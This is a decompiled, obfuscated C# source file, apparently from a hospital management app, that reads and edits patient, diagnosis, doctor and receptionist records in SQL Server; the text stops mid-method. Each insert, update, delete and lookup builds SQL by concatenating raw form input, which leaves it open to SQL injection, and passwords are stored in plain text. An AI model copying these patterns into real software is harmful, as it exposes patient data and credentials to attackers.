using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Xml.Serialization;
using Ba95Nn;
using Cp6r3F;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Ne12Qa;
using b1D6So;
using i6NP;
using n8Z0;
using o6FHd3;

namespace i1J6;

public class m4DM
{
	private object T;

	private object m_n;

	private object O;

	private object s;

	private object k;

	private object V;

	private object H;

	private object E;

	private object I;

	private object R;

	private object d;

	private object Q;

	private object B;

	private object a;

	private object m_J;

	private object w;

	private object y;

	private object Z;

	private object nT;

	private object nO;

	private e1TFq0.Hc4m6Q r;

	public object K
	{
		get
		{
			return s;
		}
		set
		{
			s = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object F
	{
		get
		{
			return k;
		}
		set
		{
			k = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object b
	{
		get
		{
			return V;
		}
		set
		{
			V = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object n
	{
		get
		{
			return r.y;
		}
		set
		{
			object objectValue = RuntimeHelpers.GetObjectValue(value);
			r.y = objectValue;
		}
	}

	public object J
	{
		get
		{
			return H;
		}
		set
		{
			H = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public m4DM()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		ICloneable cloneable = (ICloneable)new SqlConnection("Data Source=(LocalDB)\\MSSQLLocalDB;AttachDbFilename=A:\\Ritik Dev\\HospitalDB\\HospitalDB.mdf;Integrated Security=True;Connect Timeout=30");
		r.V = (SqlConnection)cloneable;
	}

	private void k7Y2()
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		r.V.Open();
		object obj = (object)new SqlCommand("Select * From PatientTb", r.V);
		IDbDataAdapter dbDataAdapter = (IDbDataAdapter)new SqlDataAdapter((SqlCommand)((obj is SqlCommand) ? obj : null));
		MarshalByValueComponent marshalByValueComponent = new DataTable();
		((DbDataAdapter)((dbDataAdapter is SqlDataAdapter) ? dbDataAdapter : null)).Fill(marshalByValueComponent as DataTable);
		NewLateBinding.LateSetComplex(K, (Type)null, "DataSource", new object[1] { (DataTable)marshalByValueComponent }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(K, (Type)null, "DisplayMember", new object[1] { "PatientId" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(K, (Type)null, "ValueMember", new object[1] { "PatientId" }, (string[])null, (Type[])null, false, true);
		r.V.Close();
	}

	public void Ni08()
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		r.V.Open();
		object obj = "select * from DiagnosisTb";
		IDataAdapter dataAdapter = (IDataAdapter)new SqlDataAdapter((string)obj, r.V);
		MarshalByValueComponent marshalByValueComponent = new DataSet();
		((DbDataAdapter)((dataAdapter is SqlDataAdapter) ? dataAdapter : null)).Fill(marshalByValueComponent as DataSet);
		NewLateBinding.LateSetComplex(F, (Type)null, "DataSource", new object[1] { ((DataSet)marshalByValueComponent).Tables[0] }, (string[])null, (Type[])null, false, true);
		r.V.Close();
	}

	private void Zw7n()
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		r.V.Open();
		object obj = (object)new SqlCommand("Select * From TreatmentTb", r.V);
		object obj2 = (object)new SqlDataAdapter((SqlCommand)obj);
		IXmlSerializable xmlSerializable = new DataTable();
		((DbDataAdapter)((obj2 is SqlDataAdapter) ? obj2 : null)).Fill(xmlSerializable as DataTable);
		NewLateBinding.LateSetComplex(b, (Type)null, "DataSource", new object[1] { (DataTable)xmlSerializable }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(b, (Type)null, "DisplayMember", new object[1] { "TreatDesc" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(b, (Type)null, "ValueMember", new object[1] { "TreatDesc" }, (string[])null, (Type[])null, false, true);
		r.V.Close();
	}

	private void m7NP(object sender, EventArgs e)
	{
		k7Y2();
		Zw7n();
		c1H7();
	}

	private void Hj2o(object sender, EventArgs e)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Expected O, but got Unknown
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		r.V.Open();
		object obj = "Select * from PatientTb where PatientId = '" + NewLateBinding.LateGet(K, (Type)null, "SelectedValue", new object[0], (string[])null, (Type[])null, (bool[])null).ToString() + "'";
		ICloneable cloneable = (ICloneable)new SqlCommand(obj as string, r.V);
		new DataTable();
		DbDataReader dbDataReader = (DbDataReader)(object)((SqlCommand)cloneable).ExecuteReader();
		while (((SqlDataReader)((dbDataReader is SqlDataReader) ? dbDataReader : null)).Read())
		{
			NewLateBinding.LateSetComplex(n, (Type)null, "Text", new object[1] { ((SqlDataReader)((dbDataReader is SqlDataReader) ? dbDataReader : null)).get_Item(1) }, (string[])null, (Type[])null, false, true);
		}
		r.V.Close();
	}

	private void Ht0e(object sender, EventArgs e)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Expected O, but got Unknown
		r.V.Open();
		ICloneable cloneable = "Select * from TreatmentTb where TreatDesc = '" + NewLateBinding.LateGet(b, (Type)null, "SelectedValue", new object[0], (string[])null, (Type[])null, (bool[])null).ToString() + "'";
		DbCommand dbCommand = (DbCommand)new SqlCommand(cloneable as string, r.V);
		new DataTable();
		DbDataReader dbDataReader = (DbDataReader)(object)((SqlCommand)((dbCommand is SqlCommand) ? dbCommand : null)).ExecuteReader();
		while (((SqlDataReader)((dbDataReader is SqlDataReader) ? dbDataReader : null)).Read())
		{
			NewLateBinding.LateSetComplex(J, (Type)null, "Text", new object[1] { ((SqlDataReader)((dbDataReader is SqlDataReader) ? dbDataReader : null)).get_Item(2) }, (string[])null, (Type[])null, false, true);
		}
		r.V.Close();
	}

	internal void s3C6()
	{
		throw new NotImplementedException();
	}

	private void g4P6(object sender, EventArgs e)
	{
		//IL_0183: Unknown result type (might be due to invalid IL or missing references)
		//IL_0189: Expected O, but got Unknown
		//IL_019c: Unknown result type (might be due to invalid IL or missing references)
		r.V.Open();
		object obj = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)" insert into DiagnosisTb values(", NewLateBinding.LateGet(T, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)","), (object)NewLateBinding.LateGet(K, (Type)null, "SelectedValue", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)",'"), NewLateBinding.LateGet(n, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(this.m_n, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(r.o, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(O, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), (object)NewLateBinding.LateGet(b, (Type)null, "SelectedValue", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"',"), NewLateBinding.LateGet(J, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)")"));
		object obj2 = (object)new SqlCommand((string)obj, r.V);
		((SqlCommand)((obj2 is SqlCommand) ? obj2 : null)).ExecuteNonQuery();
		Interaction.MsgBox((object)"Diagnosis Successfully Added", (MsgBoxStyle)0, (object)null);
		r.V.Close();
		c1H7();
	}

	private void m2NL(object sender, EventArgs e)
	{
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0238: Unknown result type (might be due to invalid IL or missing references)
		//IL_023e: Expected O, but got Unknown
		//IL_0251: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToBoolean(Operators.OrObject(Operators.OrObject(Operators.OrObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(T, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false), Operators.CompareObjectEqual(NewLateBinding.LateGet(this.m_n, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(r.o, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(O, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))))
		{
			Interaction.MsgBox((object)"Incomplete Information", (MsgBoxStyle)0, (object)null);
			return;
		}
		r.V.Open();
		ICloneable cloneable = (ICloneable)new SqlCommand(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("Update DiagnosisTb set PatId ='" + NewLateBinding.LateGet(K, (Type)null, "SelectedValue", new object[0], (string[])null, (Type[])null, (bool[])null).ToString() + "', PatName='"), NewLateBinding.LateGet(n, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"', Symptoms='"), NewLateBinding.LateGet(this.m_n, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"', Medicines='"), NewLateBinding.LateGet(r.o, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"', Diagnosis='"), NewLateBinding.LateGet(O, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"', Treatment ='"), (object)NewLateBinding.LateGet(b, (Type)null, "SelectedValue", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"', Cost ='"), NewLateBinding.LateGet(J, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' Where DiagID = "), NewLateBinding.LateGet(T, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"")), r.V);
		((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).ExecuteNonQuery();
		Interaction.MsgBox((object)"Receptionist Updated Successfully", (MsgBoxStyle)0, (object)null);
		r.V.Close();
		c1H7();
	}

	private void s4YQ(object sender, EventArgs e)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(T, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))
		{
			Interaction.MsgBox((object)"Enter The Diagnosis ID", (MsgBoxStyle)0, (object)null);
			return;
		}
		r.V.Open();
		object obj = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Delete from DiagnosisTb where DiagID=", NewLateBinding.LateGet(T, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)""));
		ICloneable cloneable = (ICloneable)new SqlCommand((string)obj, r.V);
		((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).ExecuteNonQuery();
		Interaction.MsgBox((object)"Diagnosis Delete", (MsgBoxStyle)0, (object)null);
		r.V.Close();
		c1H7();
	}

	private void Rn9e(object sender, EventArgs e)
	{
		object obj = new x6WSe8();
		(obj as x6WSe8).c7Q4Sk();
	}

	private void m7K5(object sender, EventArgs e)
	{
		object obj = new Jy71To();
		((Jy71To)obj).Df8b9W();
	}

	private void Hf8y(object sender, EventArgs e)
	{
		object obj = new p1HNe2();
		((p1HNe2)obj).e4R9Af();
	}

	private void Xa8t(object sender, EventArgs e)
	{
		object obj = new n6R9Wx();
		(obj as n6R9Wx).c7W6Hx();
	}

	private void w6JN(object sender, EventArgs e)
	{
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_0137: Expected O, but got Unknown
		//IL_014a: Unknown result type (might be due to invalid IL or missing references)
		r.V.Open();
		IComparable<string> comparable = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"insert into DoctorTb values(", NewLateBinding.LateGet(E, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)",'"), NewLateBinding.LateGet(I, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), (object)NewLateBinding.LateGet(R, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"', "), NewLateBinding.LateGet(r.P, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)", '"), NewLateBinding.LateGet(r.L, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(d, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"')"));
		object obj = (object)new SqlCommand((string)comparable, r.V);
		((SqlCommand)((obj is SqlCommand) ? obj : null)).ExecuteNonQuery();
		Interaction.MsgBox((object)"Doctor Successfully Added", (MsgBoxStyle)0, (object)null);
		r.V.Close();
		c1H7();
	}

	public void At48()
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Expected O, but got Unknown
		r.V.Open();
		object obj = "select * from DoctorTb";
		ICloneable cloneable = (ICloneable)new SqlDataAdapter((string)obj, r.V);
		object obj2 = new DataSet();
		((DbDataAdapter)(SqlDataAdapter)cloneable).Fill(obj2 as DataSet);
		NewLateBinding.LateSet(Q, (Type)null, "DataSource", new object[1] { ((DataSet)obj2).Tables[0] }, (string[])null, (Type[])null);
		r.V.Close();
	}

	private void Ap87(object sender, EventArgs e)
	{
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f1: Expected O, but got Unknown
		//IL_0204: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToBoolean(Operators.OrObject(Operators.OrObject(Operators.OrObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(E, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false), Operators.CompareObjectEqual(NewLateBinding.LateGet(I, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(r.L, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(d, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))))
		{
			Interaction.MsgBox((object)"Incomplete Information", (MsgBoxStyle)0, (object)null);
			return;
		}
		r.V.Open();
		object obj = (object)new SqlCommand(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Update DoctorTb set DoctorName ='", NewLateBinding.LateGet(I, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"', DoctorGender ='"), (object)NewLateBinding.LateGet(R, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"',DoctorExp ="), NewLateBinding.LateGet(r.P, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)",DoctorSpec ='"), NewLateBinding.LateGet(r.L, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"', DoctorPass='"), NewLateBinding.LateGet(d, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' Where DoctorID = "), NewLateBinding.LateGet(E, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"")), r.V);
		((SqlCommand)((obj is SqlCommand) ? obj : null)).ExecuteNonQuery();
		Interaction.MsgBox((object)"Doctor Updated Successfully", (MsgBoxStyle)0, (object)null);
		r.V.Close();
		c1H7();
	}

	private void z2NX(object sender, EventArgs e)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(E, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))
		{
			Interaction.MsgBox((object)"Enter The Doctor ID", (MsgBoxStyle)0, (object)null);
			return;
		}
		r.V.Open();
		IEquatable<string> equatable = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Delete from DoctorTb where DoctorID=", NewLateBinding.LateGet(E, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)""));
		ICloneable cloneable = (ICloneable)new SqlCommand(equatable as string, r.V);
		((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).ExecuteNonQuery();
		Interaction.MsgBox((object)"Doctor Delete", (MsgBoxStyle)0, (object)null);
		r.V.Close();
		c1H7();
	}

	private void Fg65(object sender, EventArgs e)
	{
		c1H7();
	}

	private void Nw24(object sender, EventArgs e)
	{
		object obj = new e1TFq0();
		(obj as e1TFq0).g0DJf5();
	}

	private void a9BW(object sender, EventArgs e)
	{
		object obj = new n6R9Wx();
		(obj as n6R9Wx).c7W6Hx();
	}

	private void Sx23(object sender, EventArgs e)
	{
		object obj = new x6WSe8();
		(obj as x6WSe8).c7Q4Sk();
	}

	private void z6ZW(object sender, EventArgs e)
	{
		object obj = new p1HNe2();
		(obj as p1HNe2).e4R9Af();
	}

	internal void j0TE()
	{
		throw new NotImplementedException();
	}

	private void n3S5(object sender, EventArgs e)
	{
		//IL_0164: Unknown result type (might be due to invalid IL or missing references)
		//IL_016a: Expected O, but got Unknown
		//IL_016b: Unknown result type (might be due to invalid IL or missing references)
		//IL_017d: Unknown result type (might be due to invalid IL or missing references)
		r.V.Open();
		object obj = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"insert into PatientTb values(", NewLateBinding.LateGet(B, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)",'"), NewLateBinding.LateGet(n, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), (object)NewLateBinding.LateGet(a, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"','"), (object)NewLateBinding.LateGet(r.S, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"','"), NewLateBinding.LateGet(r.R, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(this.m_J, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(r.B, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"')"));
		ICloneable cloneable = (ICloneable)new SqlCommand(obj as string, r.V);
		((SqlCommand)cloneable).ExecuteNonQuery();
		Interaction.MsgBox((object)"Patient Successfully Added", (MsgBoxStyle)0, (object)null);
		r.V.Close();
		c1H7();
	}

	public void e5H8()
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Expected O, but got Unknown
		r.V.Open();
		IComparable comparable = "select * from PatientTb";
		DbDataAdapter dbDataAdapter = (DbDataAdapter)new SqlDataAdapter(comparable as string, r.V);
		IListSource listSource = new DataSet();
		((DbDataAdapter)(SqlDataAdapter)dbDataAdapter).Fill(listSource as DataSet);
		NewLateBinding.LateSet(r.w, (Type)null, "DataSource", new object[1] { ((DataSet)listSource).Tables[0] }, (string[])null, (Type[])null);
		r.V.Close();
	}

	private void Tm6i(object sender, EventArgs e)
	{
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_019e: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a4: Expected O, but got Unknown
		//IL_01a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b7: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToBoolean(Operators.OrObject(Operators.OrObject(Operators.OrObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(B, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false), Operators.CompareObjectEqual(NewLateBinding.LateGet(n, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(r.B, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(r.R, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))))
		{
			Interaction.MsgBox((object)"Incomplete Information", (MsgBoxStyle)0, (object)null);
			return;
		}
		r.V.Open();
		ICloneable cloneable = (ICloneable)new SqlCommand(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Update PatientTb set PatientName ='", NewLateBinding.LateGet(n, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"', PatientGender='"), (object)NewLateBinding.LateGet(a, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"', PatientBlood='"), (object)NewLateBinding.LateGet(r.S, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"' Where PatientId = "), NewLateBinding.LateGet(B, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"")), r.V);
		((SqlCommand)cloneable).ExecuteNonQuery();
		Interaction.MsgBox((object)"Patient Updated Successfully", (MsgBoxStyle)0, (object)null);
		r.V.Close();
		c1H7();
	}

	private void g1QT(object sender, EventArgs e)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(B, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))
		{
			Interaction.MsgBox((object)"Enter The Patient ID", (MsgBoxStyle)0, (object)null);
			return;
		}
		r.V.Open();
		IEnumerable enumerable = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Delete from PatientTb where PatientId=", NewLateBinding.LateGet(B, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)""));
		object obj = (object)new SqlCommand((string)enumerable, r.V);
		((SqlCommand)((obj is SqlCommand) ? obj : null)).ExecuteNonQuery();
		Interaction.MsgBox((object)"Patient Delete", (MsgBoxStyle)0, (object)null);
		r.V.Close();
		c1H7();
	}

	private void w5F0(object sender, EventArgs e)
	{
		c1H7();
	}

	private void t5SZ(object sender, EventArgs e)
	{
		object obj = new Jy71To();
		((Jy71To)obj).Df8b9W();
	}

	private void x3CA(object sender, EventArgs e)
	{
		object obj = new x6WSe8();
		((x6WSe8)obj).c7Q4Sk();
	}

	private void x3WJ(object sender, EventArgs e)
	{
		object obj = new n6R9Wx();
		(obj as n6R9Wx).c7W6Hx();
	}

	private void y0QG(object sender, EventArgs e)
	{
		object obj = new e1TFq0();
		((e1TFq0)obj).g0DJf5();
	}

	internal void Be37()
	{
		throw new NotImplementedException();
	}

	private void f2ML(object sender, EventArgs e)
	{
		//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00e9: Unknown result type (might be due to invalid IL or missing references)
		r.V.Open();
		object obj = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"insert into ReceptionistTb values(", NewLateBinding.LateGet(w, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)",'"), NewLateBinding.LateGet(y, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(Z, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(nT, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"')"));
		DbCommand dbCommand = (DbCommand)new SqlCommand((string)obj, r.V);
		((SqlCommand)((dbCommand is SqlCommand) ? dbCommand : null)).ExecuteNonQuery();
		Interaction.MsgBox((object)"Receptionist Successfully Added", (MsgBoxStyle)0, (object)null);
		r.V.Close();
		c1H7();
	}

	public void Kb30()
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Expected O, but got Unknown
		r.V.Open();
		IEnumerable enumerable = "select * from ReceptionistTb";
		IDbDataAdapter dbDataAdapter = (IDbDataAdapter)new SqlDataAdapter(enumerable as string, r.V);
		IXmlSerializable xmlSerializable = new DataSet();
		((DbDataAdapter)(SqlDataAdapter)dbDataAdapter).Fill((DataSet)xmlSerializable);
		NewLateBinding.LateSet(r.k, (Type)null, "DataSource", new object[1] { (xmlSerializable as DataSet).Tables[0] }, (string[])null, (Type[])null);
		r.V.Close();
	}

	private void Tk61(object sender, EventArgs e)
	{
		c1H7();
	}

	private void Jz5y(object sender, EventArgs e)
	{
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0185: Unknown result type (might be due to invalid IL or missing references)
		//IL_018b: Expected O, but got Unknown
		//IL_018c: Unknown result type (might be due to invalid IL or missing references)
		//IL_019e: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToBoolean(Operators.OrObject(Operators.OrObject(Operators.OrObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(w, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false), Operators.CompareObjectEqual(NewLateBinding.LateGet(y, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(Z, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(nT, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))))
		{
			Interaction.MsgBox((object)"Incomplete Information", (MsgBoxStyle)0, (object)null);
			return;
		}
		r.V.Open();
		DbCommand dbCommand = (DbCommand)new SqlCommand(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Update ReceptionistTb set RecepName ='", NewLateBinding.LateGet(y, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"', RecepPhone='"), NewLateBinding.LateGet(Z, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"', RecepPass='"), NewLateBinding.LateGet(nT, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' Where RecepID = "), NewLateBinding.LateGet(w, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"")), r.V);
		((SqlCommand)dbCommand).ExecuteNonQuery();
		Interaction.MsgBox((object)"Receptionist Updated Successfully", (MsgBoxStyle)0, (object)null);
		r.V.Close();
		c1H7();
	}

	private void Xc83(object sender, EventArgs e)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
